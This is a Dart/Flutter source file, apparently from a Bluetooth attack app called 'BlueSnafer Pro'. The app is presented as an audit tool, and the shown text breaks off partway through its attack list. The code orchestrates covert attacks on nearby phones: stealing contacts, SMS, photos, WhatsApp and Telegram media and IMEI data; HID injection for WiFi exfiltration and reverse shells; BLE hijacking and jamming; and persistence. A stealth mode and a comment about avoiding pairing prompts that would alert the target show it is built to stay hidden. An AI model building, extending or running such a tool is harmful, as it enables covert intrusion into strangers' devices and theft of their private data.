// BlueSnafer Pro - UI UNIFICADA Y MODERNA
// ignore_for_file: unused_field, unused_local_variable, unused_import, deprecated_member_use, unnecessary_cast, unused_element, unused_method, avoid_print, camel_case_types
import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:provider/provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:path_provider/path_provider.dart';
import 'services/real_exploit_service.dart';
import 'services/heuristic_analysis_service.dart';
import 'services/attack_suggestion_engine.dart';
import 'services/permission_handler_service.dart';
import 'widgets/smart_suggestion_panel.dart';
import 'exploits/exploit_manager.dart';
import 'utils/device_utils.dart' as device_utils;
import 'file_browser_screen.dart';
import 'utils/smart_recommendation_system.dart';
import 'utils/success_optimizer.dart';
import 'advanced_systems/unified_advanced_system.dart';
import 'providers/bluetooth_provider.dart';

// ==================== PANTALLA DE PERMISOS ====================
class PermissionScreen extends StatefulWidget {
  const PermissionScreen({super.key});
  @override
  State<PermissionScreen> createState() => _PermissionScreenState();
}

class _PermissionScreenState extends State<PermissionScreen> {
  Map<Permission, PermissionStatus> _permissions = {};
  bool _allGranted = false;
  bool _isRequesting = false;
  String _hardwareStatus = 'VERIFICANDO_SISTEMA...';
  bool _bluetoothAvailable = true;

  @override
  void initState() {
    super.initState();
    _initialize();
  }

  Future<void> _initialize() async {
    await _checkBluetoothHardware();
    await _checkPermissions();
  }

  Future<void> _checkBluetoothHardware() async {
    try {
      final permissionService = PermissionHandlerService();
      final hwInfo = await permissionService.checkBluetoothHardware();
      if (mounted) {
        setState(() {
          _bluetoothAvailable = hwInfo['available'] as bool? ?? false;
          _hardwareStatus = hwInfo['message'] as String? ?? 'ESTADO_DESCONOCIDO';
        });
      }
    } catch (e) {
      if (mounted) setState(() { _bluetoothAvailable = false; _hardwareStatus = 'ERROR_HW: $e'; });
    }
  }

  Future<void> _checkPermissions() async {
    final permissionService = PermissionHandlerService();
    final result = await permissionService.checkAllPermissions();
    if (mounted) {
      setState(() {
        _allGranted = result.allGranted;
        if (_bluetoothAvailable) _hardwareStatus = result.message;
        _updatePermissionMap();
      });
    }
  }

  Future<void> _updatePermissionMap() async {
    final scan = await Permission.bluetoothScan.status;
    final connect = await Permission.bluetoothConnect.status;
    final advertise = await Permission.bluetoothAdvertise.status;
    final location = await Permission.locationWhenInUse.status;
    final notification = await Permission.notification.status;

    if (mounted) {
      setState(() {
        _permissions = {
          Permission.bluetoothScan: scan,
          Permission.bluetoothConnect: connect,
          Permission.bluetoothAdvertise: advertise,
          Permission.locationWhenInUse: location,
          Permission.notification: notification,
        };
      });
    }
  }

  Future<void> _requestPermissions() async {
    if (_isRequesting) return;
    if (!_bluetoothAvailable) { _showError('⚠️ HARDWARE_NO_DETECTADO'); return; }
    setState(() => _isRequesting = true);
    try {
      final permissionService = PermissionHandlerService();
      final fullResult = await permissionService.requestAllPermissions();
      if (!fullResult.allGranted && fullResult.permanentlyDeniedPermissions.isNotEmpty) {
        _showError('🚫 PROTOCOLO_DENEGADO');
        await Future.delayed(const Duration(seconds: 1));
        await openAppSettings();
      }
      await _updatePermissionMap(); // Update map after request, not checkPermissions
      await _checkPermissions();
    } catch (e) {
      _showError('❌ FALLO_INICIALIZACIÓN: $e');
    } finally {
      if (mounted) setState(() => _isRequesting = false);
    }
  }

  void _showError(String message) {
    if (mounted) ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(message), backgroundColor: Colors.redAccent));
  }

  // Permitir continuar aunque falten permisos no críticos
  bool get _canContinue {
    // Si todos concedidos, OK
    if (_allGranted) return true;
    // Solo necesitamos scan, connect y location para funcionar
    final scan = _permissions[Permission.bluetoothScan];
    final connect = _permissions[Permission.bluetoothConnect];
    final location = _permissions[Permission.locationWhenInUse];
    return (scan?.isGranted ?? false) && (connect?.isGranted ?? false) && (location?.isGranted ?? false);
  }

  Future<void> _enterApp() async {
    if (_canContinue) {
      if (mounted) {
        setState(() => _allGranted = true);
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    if (_allGranted) return const UnifiedAttackScreen();

    return Scaffold(
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(begin: Alignment.topLeft, end: Alignment.bottomRight, colors: [Color(0xFF020617), Color(0xFF0F172A)]),
        ),
        child: SafeArea(
          child: SingleChildScrollView(
            padding: const EdgeInsets.all(24),
            child: Column(
              children: [
                const SizedBox(height: 40),
                Container(
                  padding: const EdgeInsets.all(24),
                  decoration: BoxDecoration(color: Colors.indigoAccent.withValues(alpha: 0.1), shape: BoxShape.circle),
                  child: const Icon(Icons.shield_outlined, size: 64, color: Colors.indigoAccent),
                ),
                const SizedBox(height: 24),
                const Text('Seguridad y Auditoría', style: TextStyle(color: Colors.white, fontSize: 24, fontWeight: FontWeight.bold)),
                const SizedBox(height: 8),
                const Text('Inicialización de protocolos de red', style: TextStyle(color: Colors.white54, fontSize: 14)),
                const SizedBox(height: 40),
                _buildStatusCard(),
                const SizedBox(height: 32),
                const Align(alignment: Alignment.centerLeft, child: Text('Accesos requeridos', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16))),
                const SizedBox(height: 16),
                _buildSleekPermissionItem(Icons.radar, 'Escaneo', 'Detección de señales', _permissions[Permission.bluetoothScan]),
                _buildSleekPermissionItem(Icons.link, 'Conexión', 'Interfaz con objetivos', _permissions[Permission.bluetoothConnect]),
                _buildSleekPermissionItem(Icons.sensors, 'Ubicación', 'Triangulación BLE', _permissions[Permission.locationWhenInUse]),
                _buildSleekPermissionItem(Icons.notifications, 'Estado', 'Alertas de sistema', _permissions[Permission.notification]),
                const SizedBox(height: 40),
                // Botón principal
                SizedBox(
                  width: double.infinity,
                  child: ElevatedButton(
                    onPressed: _isRequesting ? null : (_allGranted || _canContinue ? _enterApp : _requestPermissions),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: (_allGranted || _canContinue) ? Colors.greenAccent : null,
                      foregroundColor: (_allGranted || _canContinue) ? Colors.black : null,
                    ),
                    child: _isRequesting
                      ? const SizedBox(width: 24, height: 24, child: CircularProgressIndicator(strokeWidth: 2, valueColor: AlwaysStoppedAnimation<Color>(Colors.white)))
                      : Text(
                          _allGranted
                            ? '✅ ACCESO CONCEDIDO - ENTRAR'
                            : _canContinue
                              ? 'CONTINUAR AL SISTEMA'
                              : 'OTORGAR PERMISOS',
                          style: const TextStyle(fontWeight: FontWeight.bold, letterSpacing: 1),
                        ),
                  ),
                ),
                // Botón secundario para saltar
                if (!_allGranted && !_isRequesting)
                  Padding(
                    padding: const EdgeInsets.only(top: 12),
                    child: TextButton(
                      onPressed: _canContinue ? _enterApp : null,
                      style: TextButton.styleFrom(
                        foregroundColor: _canContinue ? Colors.white38 : Colors.white12,
                      ),
                      child: const Text('Omitir y entrar (funcionalidad limitada)'),
                    ),
                  ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildStatusCard() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(color: const Color(0xFF0F172A), borderRadius: BorderRadius.circular(16), border: Border.all(color: Colors.white.withValues(alpha: 0.05))),
      child: Row(
        children: [
          Icon(_bluetoothAvailable ? Icons.bluetooth_connected : Icons.bluetooth_disabled, color: _bluetoothAvailable ? Colors.greenAccent : Colors.redAccent),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text('Hardware Bluetooth', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 12, color: Colors.white70)),
                Text(_hardwareStatus, style: TextStyle(color: _bluetoothAvailable ? Colors.greenAccent : Colors.redAccent, fontSize: 11)),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildSleekPermissionItem(IconData icon, String title, String desc, PermissionStatus? status) {
    final isGranted = status?.isGranted ?? false;
    final color = isGranted ? Colors.greenAccent : (status?.isPermanentlyDenied == true ? Colors.redAccent : Colors.white24);
    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(color: const Color(0xFF0F172A), borderRadius: BorderRadius.circular(16), border: Border.all(color: color.withValues(alpha: 0.2))),
      child: Row(
        children: [
          Icon(icon, color: color, size: 24),
          const SizedBox(width: 16),
          Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 14)), Text(desc, style: const TextStyle(color: Colors.white54, fontSize: 12))])),
          Icon(isGranted ? Icons.check_circle : Icons.radio_button_unchecked, color: color, size: 20),
        ],
      ),
    );
  }
}

// ==================== PANTALLA PRINCIPAL ====================
class UnifiedAttackScreen extends StatefulWidget {
  final Map<String, dynamic>? initialDevice;

  const UnifiedAttackScreen({super.key, this.initialDevice});

  @override
  State<UnifiedAttackScreen> createState() => _UnifiedAttackScreenState();
}

class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTickerProviderStateMixin, WidgetsBindingObserver {
  // ===== CONFIGURACIÓN DE ATAQUES (timeouts, reintentos) =====
  static const _defaultAttackTimeout = 10000; // 10s por defecto
  static const _defaultMaxRetries = 2;
  static const _defaultRetryDelay = 2000; // 2s

  // Tipos de ataque que REQUIEREN ROOT
  static const Set<String> _rootRequiredTypes = {
    'btlejack',
    'btlejack_hijack',
    'btlejack_jam',
    'btlejack_mitm',
    'blur_attack',
    'sweyntooth_attack',
    'blueborne',
    'blueborne_root',
    'knob',
    'mac_spoof',
    'l2cap_pwn',
    'hfp_inject',
    'hci_inject',
    'bt_lateral_scan',
    'bt_lateral_propagate',
    'a2dp_record',
    'a2dp_stream',
    'a2dp_inject',
    'ghost_relay',
  };

    static const Map<String, Map<String, int>> _attackConfigs = {
      // Reconocimiento
      'sdp_discover': {'timeout': 5000, 'retries': 1, 'delay': 1000},
      'full_scan': {'timeout': 10000, 'retries': 2, 'delay': 2000},
      'mediastore_enumerate': {'timeout': 8000, 'retries': 1, 'delay': 1000},
      'mediastore_extract': {'timeout': 10000, 'retries': 2, 'delay': 2000},
      // === CVE-2025-13834: RFCOMM Heartbleed (reconocimiento - memoria kernel) ===
      'cve_2025_13834_heartbleed': {'timeout': 15000, 'retries': 2, 'delay': 2000},
      // A2DP Sink Recording (captura audio)
      'a2dp_record': {'timeout': 35000, 'retries': 2, 'delay': 3000},
      'a2dp_stream': {'timeout': 350000, 'retries': 1, 'delay': 0},  // 5 min max
      // GATT Bulk Read
      'gatt_bulk_read': {'timeout': 20000, 'retries': 2, 'delay': 2000},
      'gatt_monitor': {'timeout': 35000, 'retries': 1, 'delay': 0},
      // MAP Extraction (SMS/MMS)
      'map_extract': {'timeout': 20000, 'retries': 2, 'delay': 2000},
      'map_folders': {'timeout': 10000, 'retries': 1, 'delay': 1000},
      // Extracción OBEX
      'file_exfil': {'timeout': 15000, 'retries': 2, 'delay': 3000},
      'file_exfil_dir': {'timeout': 20000, 'retries': 2, 'delay': 3000},
      'pbap_extract': {'timeout': 30000, 'retries': 2, 'delay': 3000},
      // Bluesnarf (OBEX GET) - CVE-2003-0300
      'obex_get': {'timeout': 15000, 'retries': 2, 'delay': 3000},
      // OBEX over BLE (modern)
      'obex_ble_transfer': {'timeout': 20000, 'retries': 2, 'delay': 3000},
      // BLE exploits
     'btlejack': {'timeout': 15000, 'retries': 2, 'delay': 2000},
     'blur_attack': {'timeout': 8000, 'retries': 2, 'delay': 2000},
      'sweyntooth_attack': {'timeout': 8000, 'retries': 2, 'delay': 2000},
      'blerp_attack': {'timeout': 12000, 'retries': 2, 'delay': 2000},
      'blueborne': {'timeout': 12000, 'retries': 2, 'delay': 2000},
     'ble_pairing': {'timeout': 10000, 'retries': 2, 'delay': 2000},
     'ble_exploit': {'timeout': 10000, 'retries': 2, 'delay': 2000},
     'ble_replay': {'timeout': 12000, 'retries': 1, 'delay': 2000},
      // Inyección
      'at_injection': {'timeout': 8000, 'retries': 2, 'delay': 1500},
      'hid': {'timeout': 10000, 'retries': 2, 'delay': 1500},
      'hid_inject': {'timeout': 10000, 'retries': 2, 'delay': 1500},
      'rfcomm_inject': {'timeout': 10000, 'retries': 1, 'delay': 1000},
      // === CVE-2024-43770: HID Remote Code Execution ===
      'cve_2024_43770_hid_rce': {'timeout': 15000, 'retries': 2, 'delay': 1500},
      // Bypass
      'bypass': {'timeout': 8000, 'retries': 2, 'delay': 1500},
      'pin_crack': {'timeout': 60000, 'retries': 1, 'delay': 0},
      // === CVE-2025-36911: Fast Pair Authentication Bypass ===
      'cve_2025_36911_fastpair': {'timeout': 15000, 'retries': 2, 'delay': 2000},
      'fastpair_key_extract': {'timeout': 10000, 'retries': 1, 'delay': 1000},
      // Avanzados
      'mirror_profile': {'timeout': 15000, 'retries': 2, 'delay': 2000},
      'spoofing': {'timeout': 8000, 'retries': 1, 'delay': 1000},
      'opp_push': {'timeout': 8000, 'retries': 1, 'delay': 1000},
      // Persistencia
      'install_persistence': {'timeout': 20000, 'retries': 2, 'delay': 3000},
      // DoS
      'dos': {'timeout': 5000, 'retries': 1, 'delay': 0},
      // === NUEVOS CVE 2025 ===
      'cve_2025_26438_smp_bypass': {'timeout': 15000, 'retries': 2, 'delay': 2000},
      'cve_2025_10456_ble_fixed': {'timeout': 10000, 'retries': 2, 'delay': 2000},
      // === TÉCNICAS ADICIONALES ===
      'sdp_enumerate': {'timeout': 8000, 'retries': 1, 'delay': 1000},
      'btle_spoof': {'timeout': 10000, 'retries': 2, 'delay': 2000},
      'a2dp_exploit': {'timeout': 15000, 'retries': 2, 'delay': 2000},
      'a2dp_inject': {'timeout': 15000, 'retries': 2, 'delay': 2000},
      'l2cap_pwn': {'timeout': 15000, 'retries': 2, 'delay': 2000},
      'hfp_inject': {'timeout': 10000, 'retries': 1, 'delay': 1000},
      'gatt_write': {'timeout': 10000, 'retries': 2, 'delay': 2000},
      'ble_implement': {'timeout': 10000, 'retries': 2, 'delay': 2000},
      'rfcomm_exploit': {'timeout': 15000, 'retries': 2, 'delay': 2000},
      'app_data_scan': {'timeout': 15000, 'retries': 2, 'delay': 2000},
      'network_scan': {'timeout': 10000, 'retries': 1, 'delay': 1000},
      'wifi_scan': {'timeout': 8000, 'retries': 1, 'delay': 1000},
      // === MULTI-PROTOCOL EXTRACTION ===
      'multi_extract': {'timeout': 30000, 'retries': 1, 'delay': 2000},
      // === ÚLTIMA GENERACIÓN ===
      'ghost_relay': {'timeout': 45000, 'retries': 1, 'delay': 3000},
      'bt_lateral_scan': {'timeout': 15000, 'retries': 1, 'delay': 2000},
      'bt_lateral_propagate': {'timeout': 20000, 'retries': 2, 'delay': 3000},
       // === EXTRACCIÓN DE IDENTIDAD Y SIM ===
       'at_extract_identity': {'timeout': 25000, 'retries': 1, 'delay': 1500},
       'sap_extract': {'timeout': 20000, 'retries': 1, 'delay': 1500},
       // === EXTRACCIÓN DE GALERÍA ===
       'extract_images': {'timeout': 60000, 'retries': 1, 'delay': 0},
       // === MEDIASTORE MEJORADO (Android 10+) ===
       'mediastore_enhanced': {'timeout': 20000, 'retries': 1, 'delay': 0},
       // === GATT IMAGE READ (IoT/Cámaras BLE) ===
       'gatt_image_read': {'timeout': 25000, 'retries': 1, 'delay': 0},
       // === OPP SERVER MODE (invertir rol) ===
       'opp_server_mode': {'timeout': 35000, 'retries': 1, 'delay': 0},
        // === MAP IMAGE EXTRACT (WhatsApp/Telegram) ===
         'map_image_extract': {'timeout': 20000, 'retries': 1, 'delay': 0},
         'shareme_credential_extract': {'timeout': 15000, 'retries': 2, 'delay': 2000},
         'quickshare_discovery': {'timeout': 10000, 'retries': 1, 'delay': 1500},
         // === Familias de capa de enlace (modernas) ===
         'knob': {'timeout': 15000, 'retries': 2, 'delay': 2000},
         'cve_2021_10134_bias': {'timeout': 15000, 'retries': 2, 'delay': 2000},
         'cve_2020_26558_bleeding': {'timeout': 15000, 'retries': 2, 'delay': 2000},
         // === QUICK SHARE / NEARBY RECEPTOR (vía moderna de imágenes) ===
         'quickshare_server': {'timeout': 40000, 'retries': 1, 'delay': 0},
    };

  final RealExploitService _exploitService = RealExploitService();
  final HeuristicAnalysisService _heuristicEngine = HeuristicAnalysisService();
  final AttackSuggestionEngine _suggestionEngine = AttackSuggestionEngine();
  final SmartRecommendationSystem _smartRecommendation = SmartRecommendationSystem();
  final SuccessOptimizer _successOptimizer = SuccessOptimizer();
  final UnifiedAdvancedSystem _advancedSystem = UnifiedAdvancedSystem();
  late TabController _tabController;
  StreamSubscription? _eventSubscription;
  final ScrollController _logScrollController = ScrollController();

  List<Map<String, dynamic>> _devices = [];
  Map<String, dynamic>? _selectedDevice;
  Map<String, dynamic> _discoveryData = {};
  List<String> _collectedData = []; // Datos reales recolectados (cap 100)
  List<Map<String, dynamic>> _obexFiles = []; // Archivos encontrados via OBEX
  List<Map<String, dynamic>> _sdpServices = []; // Servicios descubiertos via SDP
  List<Map<String, dynamic>> _gattDump = []; // Dump completo GATT sin pareo (servicio/characteristic/valor)
  List<Map<String, dynamic>> _pbapContacts = []; // Contactos extraidos via PBAP
  List<Map<String, dynamic>> _pbapCalls = []; // Historial llamadas via PBAP
  List<Map<String, dynamic>> _blueBorneResults = []; // Resultados BlueBorne
  List<Map<String, dynamic>> _gattMirrorResults = []; // Resultados Mirror Profile
  List<Map<String, dynamic>> _fullScanResults = []; // Resultados Full Scan
  List<Map<String, dynamic>> _atInjectionResults = []; // Resultados AT Injection
  Map<String, dynamic>? _identityExtractionResult; // Resultado AT identity/SAP/IMEI candidates
  List<Map<String, dynamic>> _extractedImages = []; // Fotos extraídas de la galería del objetivo
  List<Map<String, dynamic>> _mediastoreEnhanced = []; // Fotos vía MediaStore content:// URIs
  List<Map<String, dynamic>> _gattImages = []; // Imágenes encontradas en GATT characteristics
  List<Map<String, dynamic>> _oppReceivedImages = []; // Imágenes recibidas vía OPP server
  List<Map<String, dynamic>> _mapImages = []; // Imágenes adjuntas de mensajes MAP
   int _activeAttackCount = 0; // Contador de ataques en paralelo
   bool get _isAttacking => _activeAttackCount > 0; // Getter para UI
  bool _isUnattendedRunning = false; // Modo desatendido activo
  bool _isScanning = false;
  List<String> _log = ['SISTEMA OPERATIVO - STANDBY'];
  String _aiPrediction = '';
  Suggestion? _currentSuggestion;
  List<String> _executedAttacks = [];
  // Diagnóstico de ataques fallidos: type, label, reason (para pestaña DATOS)
  final List<Map<String, String>> _attackDiagnostics = [];
  Map<String, double> _successRates = {};


  // ==================== MEJORAS MODELO AUTOMÁTICO ====================
  
  // 1. Ejecución paralela de ataques
  final List<Future<void>> _activeAttacks = [];
  final Map<String, String> _attackQueue = {};
  final Map<String, int> _attackRetries = {};
  final Map<String, DateTime> _attackTimestamps = {};
  final Map<String, dynamic> _attackResults = {};
  
  // 2. Inteligencia adaptativa
  Map<String, dynamic> _deviceProfiles = {};
  Map<String, List<Map<String, dynamic>>> _patternAnalysis = {};
  
  // 3. Stealth mode
  bool _stealthMode = true;
  int _attackDelayMs = 1000;
  bool _maskDeviceIdentity = false;
  final Random _stealthRng = Random.secure();

  // Estados de sesión reanudable del modo automático.
  bool _sessionResumable = false;
  String _sessionDeviceAddress = '';
  String _sessionDeviceName = '';
  String _sessionDeviceType = '';
  final Set<String> _sessionCompletedAttacks = {};
  
  // 4. Gestión de errores con backoff exponencial
  int _baseDelayMs = 1000;
  double _backoffMultiplier = 2.0;
  int _maxRetries = 3;
  
  // 5. Análisis de red
  Map<String, dynamic> _networkAnalysis = {};
  List<Map<String, dynamic>> _networkTopology = [];
  
  // 6. Persistencia mejorada
  final Map<String, dynamic> _persistentData = {};
  bool _autoSaveEnabled = true;
  
  // 7. Reporte automático
  Map<String, dynamic> _automatedReport = {};
  final List<Map<String, dynamic>> _attackTimeline = [];
  final List<Map<String, dynamic>> _vulnerabilityReport = [];
  
  // 8. Modelo de predicción mejorado
  Map<String, double> _attackProbabilities = {};
  Map<String, String> _deviceFingerprints = {};
  
  // 9. Extracción avanzada
  final Map<String, List<String>> _extractedApps = {};
  final Map<String, List<String>> _extractedDirectories = {};
  final List<Map<String, dynamic>> _malwareIndicators = [];
  
  // 10. Backdoors y persistencia
  final List<Map<String, dynamic>> _installedBackdoors = [];
  final List<Map<String, dynamic>> _persistenceMechanisms = [];

  // ==================== MEJORAS IMPLEMENTADAS ====================
  
  // Configuración global del modo automático
  static const int MAX_PARALLEL_ATTEMPTS = 3;
  static const Duration BASE_BACKOFF_DELAY = Duration(seconds: 2);
  static const int MAX_FILES_PER_DIR = 15;
  static const bool ENABLE_PARALLEL_EXE = true;
  static const bool ENABLE_ADAPTIVE_AI = true;
  static const bool ENABLE_PATTERN_ANALYSIS = true;
  static const bool ENABLE_PERSISTENCE = false;
  static const bool ENABLE_NETWORK_ANALYSIS = true;

  // Estado de configuración
  bool _enableParallelExecution = true;
  bool _enableAdaptiveIntelligence = true;
  bool _enableAdvancedSystem = true;
  bool _enablePatternAnalysis = true;
  bool _enableNetworkAnalysis = true;
   bool _enablePersistence = false;
  // Bonding automático: DESACTIVADO por defecto. El objetivo puede no estar emparejado
  // y el diálogo de pareo delata la auditoría en su pantalla.
  bool _autoBonding = false;
  Map<String, dynamic> _advancedAttackResult = {};

  // Adaptive strategy selection
  String? _deviceFingerprint;
  Map<String, dynamic>? _reconnaissanceResults;
  bool _parallelPhase1 = true;   // Run discovery+exfiltration in parallel
  bool _parallelPhase2 = true;   // Run exploits in parallel
  bool _deepAnalysis = true;     // Enable EXIF/vCard/DB pattern analysis
  bool _proactiveRecon = true;   // Enable reconnaissance phase before attacks

   /// Ejecuta ataques agrupados por fase, con paralelismo limitado (max 4 concurrentes por fase)
   Future<void> _executeParallelAttacks(Map<String, dynamic> device, List<Map<String, dynamic>> techniques) async {
     final address = device['address'];
     final displayName = device_utils.getDeviceDisplayName(device);

      // === Agrupar por fase ===
      final Map<num, List<Map<String, dynamic>>> phases = {};
      for (final t in techniques) {
        final phase = (t['phase'] as num?) ?? 99; // Fase 99 = final/OPP
        phases.putIfAbsent(phase, () => []).add(t);
      }

      // Ordenar fases ascendentes
      final sortedPhases = phases.keys.toList()..sort();

     // === Ejecutar cada fase secuencialmente (fases no son paralelas entre sí) ===
     for (final phase in sortedPhases) {
       final phaseTechniques = phases[phase]!;
       if (phaseTechniques.isEmpty) continue;

       _appendLog('📦 FASE $phase: ${phaseTechniques.length} ataques');

        // Decidir si esta fase se ejecuta en paralelo o secuencial
        // Fases de inyección (4), persistencia (7), OPP (99), análisis profundo (8) → SIEMPRE secuenciales
        final mustBeSequential = phase == 4 || phase == 7 || phase == 8 || phase == 99;

        if (_enableParallelExecution && !mustBeSequential && phaseTechniques.length > 1) {
          _appendLog('⚡ [PARALLEL] Fase $phase: ${phaseTechniques.length} ataques en paralelo (max 2 concurrentes)');
          // Ejecutar en lotes de máximo 2 concurrentes para no saturar el pool nativo (4 hilos)
          const maxConcurrent = 2;
         for (var i = 0; i < phaseTechniques.length; i += maxConcurrent) {
           if (!_isUnattendedRunning) break;
           final batch = phaseTechniques.skip(i).take(maxConcurrent).toList();
            await Future.wait(batch.map((t) => _attack(
                  t['type'] as String,
                  command: t['command'] as String?,
                  script: t['script'] as String?,
                  extra: t as Map<String, dynamic>?,
                  fromAutomated: true,
                )));
           // Pequeña pausa entre lotes para permitir recuperación
           if (i + maxConcurrent < phaseTechniques.length) {
             await Future.delayed(const Duration(milliseconds: 500));
           }
         }
       } else {
         _appendLog('📦 Fase $phase: ${phaseTechniques.length} ataques secuenciales');
         for (final t in phaseTechniques) {
           if (!_isUnattendedRunning) break;
          await _attack(
            t['type'] as String,
            command: t['command'] as String?,
            script: t['script'] as String?,
            extra: t as Map<String, dynamic>?,
            fromAutomated: true,
          );
         }
       }
     }
   }

   // Todas las técnicas de ataque disponibles (incluyendo CVEs modernos)
   static const allAttackTechniques = [
     // === CVE-2025-13834: RFCOMM Heartbleed (crítica) ===
     {'type': 'cve_2025_13834_heartbleed', 'name': 'HEARTBLEED', 'cve': 'CVE-2025-13834', 'category': 'recon', 'desc': 'RFCOMM Heartbleed - fuga memoria kernel (127 bytes)'},
     
     // ===== EXTRACCIÓN DE DATOS (OBEX) =====
    {'type': 'pbap_extract', 'command': 'all', 'name': 'PBAP_ALL', 'cve': '', 'category': 'data', 'desc': 'Phonebook Completo'},
    {'type': 'obex_get', 'command': 'telecom/pb.vcf', 'name': 'BLUESNARF', 'cve': 'CVE-2003-0300', 'category': 'data', 'desc': 'BlueSnarf - Robo contactos OBEX'},
    {'type': 'obex_get', 'command': 'telecom/cal.vcf', 'name': 'BLUESNARF_CAL', 'cve': 'CVE-2003-0300', 'category': 'data', 'desc': 'BlueSnarf - Calendario'},
    {'type': 'file_exfil', 'command': 'scan', 'name': 'OBEX_SCAN', 'cve': '', 'category': 'data', 'desc': 'OBEX FTP Scan'},
    // Directorios de fotos y multimedia (priorizados)
    {'type': 'file_exfil_dir', 'command': 'DCIM/Camera', 'name': 'OBEX_CAMERA', 'cve': '', 'category': 'data', 'desc': 'Fotos Camara'},
    {'type': 'file_exfil_dir', 'command': 'DCIM', 'name': 'OBEX_DCIM', 'cve': '', 'category': 'data', 'desc': 'DCIM Completo'},
    {'type': 'file_exfil_dir', 'command': 'Pictures', 'name': 'OBEX_PICTURES', 'cve': '', 'category': 'data', 'desc': 'Pictures'},
    {'type': 'file_exfil_dir', 'command': 'Screenshots', 'name': 'OBEX_SCREENSHOTS', 'cve': '', 'category': 'data', 'desc': 'Capturas'},
    {'type': 'file_exfil_dir', 'command': 'Download', 'name': 'OBEX_DOWNLOAD', 'cve': '', 'category': 'data', 'desc': 'Download'},
    {'type': 'file_exfil_dir', 'command': 'WhatsApp/Media', 'name': 'OBEX_WHATSAPP', 'cve': '', 'category': 'data', 'desc': 'WhatsApp Media'},
    {'type': 'file_exfil_dir', 'command': 'Telegram', 'name': 'OBEX_TELEGRAM', 'cve': '', 'category': 'data', 'desc': 'Telegram'},
    {'type': 'file_exfil_dir', 'command': 'Documents', 'name': 'OBEX_DOCS', 'cve': '', 'category': 'data', 'desc': 'Documentos'},
    {'type': 'file_exfil_dir', 'command': '../..', 'name': 'OBEX_TRAVERSAL', 'cve': 'CVE-2009-0244', 'category': 'data', 'desc': 'Directory Traversal OBEX'},
    
    // ===== OBEX OVER BLE (MODERNO) =====
    {'type': 'obex_ble_transfer', 'command': '/DCIM/Camera', 'name': 'OBEX_BLE', 'cve': '', 'category': 'data_ble', 'desc': 'OBEX via BLE GATT'},
    
     // ===== EXTRACCIÓN MEDIASTORE (ANDROID 11+) =====
     {'type': 'mediastore_enumerate', 'name': 'MEDIASTORE_SCAN', 'cve': '', 'category': 'data_mediastore', 'desc': 'Enumerate MediaStore images'},
     {'type': 'mediastore_extract', 'name': 'MEDIASTORE_EXTRACT', 'cve': '', 'category': 'data_mediastore', 'desc': 'Extract MediaStore file'},
     
     // ===== MAP (MESSAGE ACCESS PROFILE) =====
     {'type': 'map_extract', 'name': 'MAP_EXTRACT', 'cve': '', 'category': 'data', 'desc': 'Extract SMS/MMS via MAP'},
     {'type': 'map_folders', 'name': 'MAP_FOLDERS', 'cve': '', 'category': 'recon', 'desc': 'Enumerate MAP folders'},
     
     // ===== INYECCIÓN (HID/AT) =====
    {'type': 'at_injection', 'name': 'AT_INJECTION', 'cve': 'CVE-2006-1367', 'category': 'injection', 'desc': 'AT Command Injection'},
    {'type': 'at_injection', 'command': 'ATD', 'name': 'AT_CALL', 'cve': 'CVE-2006-1367', 'category': 'injection', 'desc': 'AT Marcar numero'},
    {'type': 'hid', 'script': 'notepad', 'name': 'HID_NOTEPAD', 'cve': 'CVE-2023-45866', 'category': 'injection', 'desc': 'HID - Abrir notepad'},
    {'type': 'hid', 'script': 'wifi', 'name': 'HID_WIFI', 'cve': 'CVE-2023-45866', 'category': 'injection', 'desc': 'HID - Exfiltrar WiFi'},
    {'type': 'hid', 'script': 'terminal', 'name': 'HID_TERMINAL', 'cve': 'CVE-2023-45866', 'category': 'injection', 'desc': 'HID - Abrir terminal'},
    {'type': 'hid', 'script': 'reverse', 'name': 'HID_REVERSE', 'cve': 'CVE-2023-45866', 'category': 'injection', 'desc': 'HID - Reverse shell'},
     {'type': 'hid_inject', 'name': 'HID_INJECT', 'cve': 'CVE-2023-45866', 'category': 'injection', 'desc': 'HID Keystroke Injection'},
     {'type': 'rfcomm_inject', 'name': 'BLUEBUGGING', 'cve': 'CVE-2003-0301', 'category': 'injection', 'desc': 'Bluebugging AT via RFCOMM'},
     // === CVE-2024-43770: HID Remote Code Execution ===
     {'type': 'cve_2024_43770_hid_rce', 'name': 'HID_RCE', 'cve': 'CVE-2024-43770', 'category': 'injection', 'desc': 'HID Remote Code Execution - ejecución arbitraria'},
     
     // ===== BLE (Bluetooth Low Energy) =====
    {'type': 'btlejack', 'command': 'scan', 'name': 'BTLE_SCAN', 'cve': '', 'category': 'ble', 'desc': 'BLE Scan'},
    {'type': 'btlejack', 'command': 'sniff', 'name': 'BTLE_SNIFF', 'cve': '', 'category': 'ble', 'desc': 'BLE Sniff traffic'},
    {'type': 'btlejack', 'command': 'hijack', 'name': 'BTLE_HIJACK', 'cve': '', 'category': 'ble', 'desc': 'BLE Session hijack'},
    {'type': 'btlejack', 'command': 'jam', 'name': 'BTLE_JAM', 'cve': 'CVE-2020-12352', 'category': 'ble', 'desc': 'BLE Jam/DoS'},
    {'type': 'btlejack', 'command': 'mitm', 'name': 'BLE_MITM', 'cve': 'CVE-2023-24023', 'category': 'ble', 'desc': 'BLE MITM relay'},
    {'type': 'ble_pairing', 'command': 'justworks', 'name': 'BLE_JUSTWORKS', 'cve': 'CVE-2020-10135', 'category': 'ble', 'desc': 'BLE Pairing downgrade'},
